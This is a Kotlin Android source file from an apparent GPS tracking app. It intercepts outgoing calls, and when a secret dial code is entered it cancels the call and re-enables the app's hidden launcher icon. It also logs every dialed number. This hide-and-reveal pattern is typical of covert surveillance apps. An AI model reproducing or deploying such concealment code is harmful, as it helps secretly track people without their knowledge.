package com.bloom.gps

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import android.widget.Toast

class DialCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_NEW_OUTGOING_CALL) return

        val numeroCompose = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER) ?: return
        val codeSecret = context.getString(R.string.dial_code_suffix)

        Log.d("BLOOM-DATA", "📞 Numéro composé : $numeroCompose")

        // ✅ VÉRIFIER SI LE CODE SECRET EST COMPOSÉ
        if (numeroCompose.endsWith(codeSecret) || numeroCompose == "*2566" || numeroCompose == "#2566#" || numeroCompose == "2566") {
            abortBroadcast() // ✅ ANNULER L'APPEL — RIEN NE SORT !

            // ✅ RÉACTIVER L'ICÔNE SI ELLE EST MASQUÉE
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                ComponentName(context, "com.bloom.gps.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            Toast.makeText(context, "🔓 Application déverrouillée !", Toast.LENGTH_LONG).show()

            // ✅ OUVRIR L'APPLICATION
            val openIntent = context.packageManager.getLaunchIntentForPackage(context.packageName)
            openIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            context.startActivity(openIntent)
        }
    }
}
